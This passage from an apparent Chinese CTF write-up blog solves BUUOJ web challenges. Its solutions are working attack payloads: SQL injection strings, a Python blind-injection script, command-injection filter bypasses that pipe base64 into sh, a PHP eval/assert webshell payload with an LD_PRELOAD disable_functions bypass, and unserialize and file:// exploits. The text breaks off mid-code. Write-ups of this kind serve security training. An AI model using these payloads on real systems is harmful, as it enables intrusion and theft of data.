href=\"https://github.com/woadsl1234/hctf_flask/%EF%BC%8C\">https://github.com/woadsl1234/hctf_flask/，</a></p>\n<p>据说本题有多种解法，一是flask的session机制，session泄露后解密出来，修改name的值为admin再用源码中的secret-key加密，就可以实现位置admin。二是用到Unicode同形字引起的安全问题：</p>\n<p>spotify任意用户密码修改漏洞](<a href=\"https://labs.spotify.com/2013/06/18/creative-usernames/\">https://labs.spotify.com/2013/06/18/creative-usernames/</a>)<br>漏洞简介:<br>找一个需要黑掉的账号，比如以bigbird为例。创建一个账户名为 ᴮᴵᴳᴮᴵᴿᴰ (in python this is the string u’\\u1d2e\\u1d35\\u1d33\\u1d2e\\u1d35\\u1d3f\\u1d30′)。然后申请修改忘记密码，修改自己申请的账号密码。修改之后以刚刚设置的密码登录bigbird。就可以成功登录。三是条件竞争。</p>\n<h2 id=\"极客大挑战-2019-Secret-File\"><a href=\"#极客大挑战-2019-Secret-File\" class=\"headerlink\" title=\"[极客大挑战 2019]Secret File\"></a>[极客大挑战 2019]Secret File</h2><p>base64_decode(/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php)</p>\n<h2 id=\"极客大挑战-2019-LoveSQL\"><a href=\"#极客大挑战-2019-LoveSQL\" class=\"headerlink\" title=\"[极客大挑战 2019]LoveSQL\"></a>[极客大挑战 2019]LoveSQL</h2><p><code>check.php?username=admin&amp;password=-1&#39;/**/union/**/select/**/1,database(),database()/**/%23</code>拿到数据库名=&gt;’geek’</p>\n<p><code>check.php?username=admin&amp;password=-1&#39;/**/union/**/select/**/1,2,(select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1)/**/%23</code>拿到表名=&gt;’geekuser’,’l0ve1ysq1’</p>\n<p><code>check.php?username=admin&amp;password=-1&#39;/**/union/**/select/**/1,2,(select/**/password/**/from/**/l0ve1ysq1/**/limit/**/15,1)/**/%23</code>拿到flag=&gt;’flag{6d319459-bf52-4be1-8371-83d8d2b8a8d2}’</p>\n<h2 id=\"极客大挑战-2019-PHP\"><a href=\"#极客大挑战-2019-PHP\" class=\"headerlink\" title=\"[极客大挑战 2019]PHP\"></a>[极客大挑战 2019]PHP</h2><p>/<a href=\"http://www.zip源码/\">www.zip源码</a></p>\n<p>看源码是PHP反序列化</p>\n<p>exp：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Name</span></span>&#123;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$username</span> = <span class=\"hljs-string\">&#x27;admin&#x27;</span>;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$password</span> = <span class=\"hljs-number\">100</span>;<br>&#125;<br><span class=\"hljs-variable\">$a</span> = <span class=\"hljs-keyword\">new</span> Name;<br>var_dump(urlencode(serialize(<span class=\"hljs-variable\">$a</span>)));<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"极客大挑战-2019-Knife\"><a href=\"#极客大挑战-2019-Knife\" class=\"headerlink\" title=\"[极客大挑战 2019]Knife\"></a>[极客大挑战 2019]Knife</h2><p>白给一句话</p>\n<h2 id=\"极客大挑战-2019-Http\"><a href=\"#极客大挑战-2019-Http\" class=\"headerlink\" title=\"[极客大挑战 2019]Http\"></a>[极客大挑战 2019]Http</h2><p>/Secret.php</p>\n<p>改Referer、UA、X-Forwarded-For</p>\n<h2 id=\"SUCTF-2019-CheckIn\"><a href=\"#SUCTF-2019-CheckIn\" class=\"headerlink\" title=\"[SUCTF 2019]CheckIn\"></a>[SUCTF 2019]CheckIn</h2><p>.user.ini(<a href=\"https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html\">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a>)</p>\n<p>主要利用就是在.user.ini文件中写入：<code>auto_prepend_file=01.gif</code>,就会在目录下的php文件中自动包含01.gif</p>\n<h2 id=\"GXYCTF2019-Ping-Ping-Ping\"><a href=\"#GXYCTF2019-Ping-Ping-Ping\" class=\"headerlink\" title=\"[GXYCTF2019]Ping Ping Ping\"></a>[GXYCTF2019]Ping Ping Ping</h2><ol>\n<li><p>利用；或者|可以执行命令</p>\n</li>\n<li><p>发现不能有空格，可以$IFS绕过,另外还有</p>\n<figure class=\"highlight mel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mel\">&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS、&#123;cat,flag.php&#125;<br></code></pre></td></tr></table></figure></li>\n<li><p>不能出现flag，通配符也不能用，只好直接全都读出来</p>\n<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stata\">/?ip=127.0.0.1|<span class=\"hljs-keyword\">cat</span><span class=\"hljs-variable\">$IFS</span>`<span class=\"hljs-keyword\">ls</span>`<br></code></pre></td></tr></table></figure>\n\n<p>或者<code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></p>\n</li>\n<li><p>另外黑名单绕过还有以下这些方法</p>\n</li>\n</ol>\n<h2 id=\"ACTF2020-新生赛-Include\"><a href=\"#ACTF2020-新生赛-Include\" class=\"headerlink\" title=\"[ACTF2020 新生赛]Include\"></a>[ACTF2020 新生赛]Include</h2><p>base64_decode(/?file=php://filter/convert.base64-encode/resource=flag.php)</p>\n<h2 id=\"ACTF2020-新生赛-BackupFile\"><a href=\"#ACTF2020-新生赛-BackupFile\" class=\"headerlink\" title=\"[ACTF2020 新生赛]BackupFile\"></a>[ACTF2020 新生赛]BackupFile</h2><p>常见备份文件 *.swp   *.bak</p>\n<p>访问index.php.bak拿到源码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-variable\">$key</span> = intval(<span class=\"hljs-variable\">$key</span>);<br><span class=\"hljs-variable\">$str</span> = <span class=\"hljs-string\">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;<br>    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$key</span> == <span class=\"hljs-variable\">$str</span>) &#123;<br>        <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$flag</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>\n\n<p>index.php?key=123拿到flag</p>\n<h2 id=\"CISCN2019-华北赛区-Day2-Web1-Hack-World\"><a href=\"#CISCN2019-华北赛区-Day2-Web1-Hack-World\" class=\"headerlink\" title=\"[CISCN2019 华北赛区 Day2 Web1]Hack World\"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><ol>\n<li>题目提示是SQL，单引号闭合没有用，双引号又被过滤了，猜测是数字型注入</li>\n<li>测试发现0，1，2返回结果不同，应该存在bool注入</li>\n<li>fuzz一下测试过滤了哪些</li>\n<li><code>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)</code>+<code>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1000)</code>结果不同，盲注拿flag</li>\n</ol>\n<h2 id=\"极客大挑战-2019-BabySQL\"><a href=\"#极客大挑战-2019-BabySQL\" class=\"headerlink\" title=\"[极客大挑战 2019]BabySQL\"></a>[极客大挑战 2019]BabySQL</h2><ol>\n<li><code>|| 1=1 #</code>拿到admin密码：”667252cbf386409fcf10e06a81c1c19a“。登陆之后发现没啥用</li>\n<li><code>password=1&#39;%20uniunionon%20seselectlect%201,2,3%23</code>测试可以注入</li>\n<li><code>password=1&#39;%20uniunionon%20seselectlect%201,2,(seselectlect%20table_name%20frfromom%20infoorrmation_schema.tables%20whewherere%20table_schema=database()%20limit%200,1)%23</code>拿到表名=&gt;”b4bsql、geekuser“</li>\n<li><code>password=1&#39;%20uniunionon%20seselectlect%201,2,(seleselectct%20column_name%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_name=&#39;b4bsql&#39;%20limit%200,1)%23 </code>拿到字段名=&gt;”id、username、password”</li>\n<li><code>password=1&#39;%20uniunionon%20seselectlect%201,2,(seleselectct%20passwoorrd%20frfromom%20b4bsql%20limit%207,1)%23</code>拿到flag</li>\n</ol>\n<h2 id=\"极客大挑战-2019-HardSQL\"><a href=\"#极客大挑战-2019-HardSQL\" class=\"headerlink\" title=\"[极客大挑战 2019]HardSQL\"></a>[极客大挑战 2019]HardSQL</h2><ol>\n<li><p>报错注入，payload</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">username</span>=admin&amp;password=admin%<span class=\"hljs-number\">27</span>^extractvalue(<span class=\"hljs-number\">1</span>,concat(<span class=\"hljs-number\">0</span>x<span class=\"hljs-number\">7</span>e,(select(right((password),<span class=\"hljs-number\">30</span>))from(H<span class=\"hljs-number\">4</span>rDsq<span class=\"hljs-number\">1</span>))))%<span class=\"hljs-number\">23</span><br></code></pre></td></tr></table></figure></li>\n<li><p>flag用left和right函数拼接</p>\n</li>\n</ol>\n<h2 id=\"极客大挑战-2019-FinalSQL\"><a href=\"#极客大挑战-2019-FinalSQL\" class=\"headerlink\" title=\"[极客大挑战 2019]FinalSQL\"></a>[极客大挑战 2019]FinalSQL</h2><ol>\n<li><p>题目提示盲注，测试<code>/search.php?id=0^1</code>可以发现存在盲注点</p>\n</li>\n<li><p>exp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> requests<br><br>url = <span class=\"hljs-string\">&quot;http://b766a75e-ee4f-41c7-847a-aac535a77c88.node3.buuoj.cn/search.php?id=&quot;</span><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">i,j</span>):</span><br>\t<span class=\"hljs-comment\">#payload = url + &quot;0^(ascii(substr((database()),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;.format(i,j) =&gt;&#x27;geek&#x27;</span><br>\t<span class=\"hljs-comment\"># payload = url + &quot;0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;.format(i,j)=&gt;&#x27;F1naI1y,Flaaaaag&#x27;</span><br>\t<span class=\"hljs-comment\"># payload = url + &quot;0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;F1naI1y&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;.format(i,j)=&gt;&#x27;id,username,password&#x27;</span><br>\tpayload = url + <span class=\"hljs-string\">&quot;0^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.<span class=\"hljs-built_in\">format</span>(i,j)<br>\t<span class=\"hljs-built_in\">print</span>(payload)<br>\tr = requests.get(payload)<br>\thtml = r.text<br>\t<span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;Click&quot;</span> <span class=\"hljs-keyword\">in</span> html:<br>\t\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">True</span><br>\t<span class=\"hljs-keyword\">else</span>:<br>\t\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">False</span><br><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">find</span>(<span class=\"hljs-params\">i</span>):</span><br>\tm1n = <span class=\"hljs-number\">33</span><br>\tm4x = <span class=\"hljs-number\">126</span><br>\t<span class=\"hljs-keyword\">while</span> m1n&lt;=m4x:<br>\t\tmid = (m1n+m4x)//<span class=\"hljs-number\">2</span><br>\t\t<span class=\"hljs-keyword\">if</span> get(i,mid):<br>\t\t\tm1n = mid+<span class=\"hljs-number\">1</span><br>\t\t<span class=\"hljs-keyword\">else</span>:<br>\t\t\tm4x = mid-<span class=\"hljs-number\">1</span><br><br>\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">chr</span>((m1n+m4x+<span class=\"hljs-number\">1</span>)//<span class=\"hljs-number\">2</span>)<br><br>flag = <span class=\"hljs-string\">&quot;&quot;</span><br><span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">100</span>,<span class=\"hljs-number\">1000</span>):<br>\ta = find(i)<br>\t<span class=\"hljs-keyword\">if</span> a==<span class=\"hljs-string\">&#x27;!&#x27;</span>:<br>\t\t<span class=\"hljs-keyword\">break</span><br>\tflag += a<br>\t<span class=\"hljs-built_in\">print</span>(flag)<br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;flag:&quot;</span>,flag)<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"极客大挑战-2019-BuyFlag\"><a href=\"#极客大挑战-2019-BuyFlag\" class=\"headerlink\" title=\"[极客大挑战 2019]BuyFlag\"></a>[极客大挑战 2019]BuyFlag</h2><ol>\n<li><p><code>view-source:http://c54f9ea8-ba26-47fa-8c09-58a7a6868706.node3.buuoj.cn/pay.php</code>看到代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;password&#x27;</span>])) &#123;<br>\t<span class=\"hljs-variable\">$password</span> = <span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;password&#x27;</span>];<br>\t<span class=\"hljs-keyword\">if</span> (is_numeric(<span class=\"hljs-variable\">$password</span>)) &#123;<br>\t\t<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;<br>\t&#125;<span class=\"hljs-keyword\">elseif</span> (<span class=\"hljs-variable\">$password</span> == <span class=\"hljs-number\">404</span>) &#123;<br>\t\t<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;Password Right!&lt;/br&gt;&quot;</span>;<br>\t&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>\n<li><p><code>money=1e15&amp;password=404aaa</code>同时修改cookie的user=0变成user=1即可拿到flag</p>\n</li>\n</ol>\n<h2 id=\"极客大挑战-2019-RCE-ME\"><a href=\"#极客大挑战-2019-RCE-ME\" class=\"headerlink\" title=\"[极客大挑战 2019]RCE ME\"></a>[极客大挑战 2019]RCE ME</h2><ol>\n<li><p>无数字、字母shell，</p>\n</li>\n<li><p><a href=\"https://blog.csdn.net/a15803617402/article/details/83589181\">https://blog.csdn.net/a15803617402/article/details/83589181</a></p>\n</li>\n<li><p><a href=\"https://www.freebuf.com/news/186298.html\">https://www.freebuf.com/news/186298.html</a></p>\n</li>\n<li><p>利用LD_PRELOAD+without send_mail绕过disable_functions，调用’/readflag’拿到flag</p>\n</li>\n<li><p>放个payload</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">?code=<span class=\"hljs-variable\">$_</span>=<span class=\"hljs-string\">&quot;`&#123;&#123;&#123;&quot;</span>^<span class=\"hljs-string\">&quot;?&lt;&gt;/&quot;</span>;<span class=\"hljs-variable\">$&#123;$_&#125;</span>[_](<span class=\"hljs-variable\">$&#123;$_&#125;</span>[__]);&amp;_=assert&amp;__=eval(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;flag&#x27;</span>])&amp;cmd=<span class=\"hljs-regexp\">/readflag&amp;outpath=/</span>var<span class=\"hljs-regexp\">/tmp/</span>a&amp;sopath=<span class=\"hljs-regexp\">/var/</span>tmp/disable.so<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"网鼎杯-2018-Fakebook\"><a href=\"#网鼎杯-2018-Fakebook\" class=\"headerlink\" title=\"[网鼎杯 2018]Fakebook\"></a>[网鼎杯 2018]Fakebook</h2><ol>\n<li><p><code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1</code>可能存在注入，用单引号测试发现报错。测试后发现是整型注入，尝试<code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=0^1</code>和<code>0^0</code>注入成功</p>\n</li>\n<li><p>虽然可以盲注，但是还是比较麻烦，既然有报错就尝试报错注入：</p>\n<p><code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20database())),1)</code>拿到了数据库名=&gt;”fakebook”</p>\n</li>\n<li><p><code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27fakebook%27)),1)</code>拿到表名=&gt;”users”</p>\n</li>\n<li><p><code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)),1)</code>拿到字段名=&gt;”no,username,passwd,data”</p>\n</li>\n<li><p><code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20substr(data,61,30)%20from%20fakebook.users)),1)</code>拿数据”1，m1n,3c9909afec25354d551dae21590bb2,<code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;m1n&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:6:&quot;m1n.me&quot;;&#125;</code>“，发现一段反序列化的字符串。是我刚刚注册的信息</p>\n</li>\n<li><p>不太懂有啥用，尝试扫后台，扫到robots.txt，/user.php.bak拿到源码</p>\n</li>\n<li><p>构造<code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=0/**/union/**/select%201,2,3,%27O:8:%22UserInfo%22:3:&#123;s:4:%22name%22;s:3:%22m1n%22;s:3:%22age%22;i:18;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;&#125;%27</code>就可以读到flag</p>\n</li>\n</ol>\n<h2 id=\"ZJCTF-2019-NiZhuanSiWei\"><a href=\"#ZJCTF-2019-NiZhuanSiWei\" class=\"headerlink\" title=\"[ZJCTF 2019]NiZhuanSiWei\"></a>[ZJCTF 2019]NiZhuanSiWei</h2><ol>\n<li><p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"> <span class=\"hljs-meta\">&lt;?php</span>  <br><span class=\"hljs-variable\">$text</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&quot;text&quot;</span>];<br><span class=\"hljs-variable\">$file</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&quot;file&quot;</span>];<br><span class=\"hljs-variable\">$password</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&quot;password&quot;</span>];<br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$text</span>)&amp;&amp;(file_get_contents(<span class=\"hljs-variable\">$text</span>,<span class=\"hljs-string\">&#x27;r&#x27;</span>)===<span class=\"hljs-string\">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class=\"hljs-variable\">$text</span>,<span class=\"hljs-string\">&#x27;r&#x27;</span>).<span class=\"hljs-string\">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class=\"hljs-keyword\">if</span>(preg_match(<span class=\"hljs-string\">&quot;/flag/&quot;</span>,<span class=\"hljs-variable\">$file</span>))&#123;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;Not now!&quot;</span>;<br>        <span class=\"hljs-keyword\">exit</span>(); <br>    &#125;<span class=\"hljs-keyword\">else</span>&#123;<br>        <span class=\"hljs-keyword\">include</span>(<span class=\"hljs-variable\">$file</span>);  <span class=\"hljs-comment\">//useless.php</span><br>        <span class=\"hljs-variable\">$password</span> = unserialize(<span class=\"hljs-variable\">$password</span>);<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$password</span>;<br>    &#125;<br>&#125;<br><span class=\"hljs-keyword\">else</span>&#123;<br>    highlight_file(<span class=\"hljs-keyword\">__FILE__</span>);<br>&#125;<br><span class=\"hljs-meta\">?&gt;</span> <br></code></pre></td></tr></table></figure></li>\n<li><p>第一层主要是考察php伪协议：<code>text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code>,同时POST”welcome to the zjctf“，可以拿到useless.php源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>  <br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Flag</span></span>&#123;  <span class=\"hljs-comment\">//flag.php  </span><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$file</span>;  <br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__tostring</span>(<span class=\"hljs-params\"></span>)</span>&#123;  <br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;file))&#123;  <br>            <span class=\"hljs-keyword\">echo</span> file_get_contents(<span class=\"hljs-keyword\">$this</span>-&gt;file); <br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&quot;</span>;<br>        <span class=\"hljs-keyword\">return</span> (<span class=\"hljs-string\">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure></li>\n<li><p>直接构造payload就可以拿到flag</p>\n</li>\n</ol>\n<h2 id=\"BJDCTF2020-Easy-MD5\"><a href=\"#BJDCTF2020-Easy-MD5\" class=\"headerlink\" title=\"[BJDCTF2020]Easy MD5\"></a>[BJDCTF2020]Easy MD5</h2><ol>\n<li><p>抓包，在header部分拿到hint：”select * from ‘admin’ where password=md5($pass,true)“，之前遇到过，输入密码”ffifdyop“，跳转到  levels91.php</p>\n</li>\n<li><p>源码：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-comment\">&lt;!--</span><br><span class=\"hljs-comment\">$a = $GET[&#x27;a&#x27;];</span><br><span class=\"hljs-comment\">$b = $_GET[&#x27;b&#x27;];</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class=\"hljs-comment\">    // wow, glzjin wants a girl friend.</span><br><span class=\"hljs-comment\">--&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>?a=s155964671a&amp;b=s878926199a跳转到 levell14.php</p>\n</li>\n<li><p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"> <span class=\"hljs-meta\">&lt;?php</span><br>error_reporting(<span class=\"hljs-number\">0</span>);<br><span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&quot;flag.php&quot;</span>;<br><br>highlight_file(<span class=\"hljs-keyword\">__FILE__</span>);<br><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;param1&#x27;</span>]!==<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;param1&#x27;</span>])===md5(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;param2&#x27;</span>]))&#123;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;<br>&#125; <br></code></pre></td></tr></table></figure>\n\n<p>强类型比较，但是php中MD5（数组）将会返回NULL，因此POST<code>param1[]=1&amp;param2[]=2</code>即可拿到flag</p>\n</li>\n</ol>\n<h2 id=\"RoarCTF-2019-Easy-Java\"><a href=\"#RoarCTF-2019-Easy-Java\" class=\"headerlink\" title=\"[RoarCTF 2019]Easy Java\"></a>[RoarCTF 2019]Easy Java</h2><ol>\n<li>WEB-INF/web.xml泄露，<a href=\"https://blog.csdn.net/wy_97/article/details/78165051\">https://blog.csdn.net/wy_97/article/details/78165051</a></li>\n<li>修改请求方法      ?filename=WEB-INF/web.xml可以看到”/Download                 FlagController        com.wm.ctf.FlagController                FlagController        /Flag “</li>\n<li>filename=WEB-INF/classes/com/wm/ctf/FlagController.class 其中有一段base64编码，解码拿到flag   </li>\n</ol>\n<h2 id=\"BUUCTF-2018-Online-Tool\"><a href=\"#BUUCTF-2018-Online-Tool\" class=\"headerlink\" title=\"[BUUCTF 2018]Online Tool\"></a>[BUUCTF 2018]Online Tool</h2><ol>\n<li><p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">isset</span>(<span 